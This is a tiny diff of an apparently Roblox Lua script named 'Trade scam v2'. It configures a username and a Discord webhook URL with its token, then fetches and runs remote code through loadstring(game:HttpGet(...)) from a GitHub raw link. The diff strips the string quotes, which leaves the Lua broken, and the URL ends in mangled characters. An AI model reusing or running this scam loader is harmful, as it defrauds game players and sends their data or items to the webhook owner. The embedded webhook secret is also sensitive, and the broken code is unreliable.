@@ -1,5 +1,5 @@
-_G.Username = "ZxckxLove"
-_G.HubName = "Trade scam v2"
-G.Webhook = "https://discordapp.com/api/webhooks/1099316672722128998/6HP4lqhVG2uiaZOSs__ZeLXtdsgvc2rCxDrZfvfKFTkVV6CIIIXRzyeGsTwX9X1fAqb"
+_G.Username = ZxckxLove
+_G.HubName = Trade scam v2
+G.Webhook = https://discordapp.com/api/webhooks/1099316672722128998/6HP4lqhVG2uiaZOSs__ZeLXtdsgvc2rCxDrZfvfKFTkVV6CIIIXRzyeGsTwX9X1fAqb
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))()
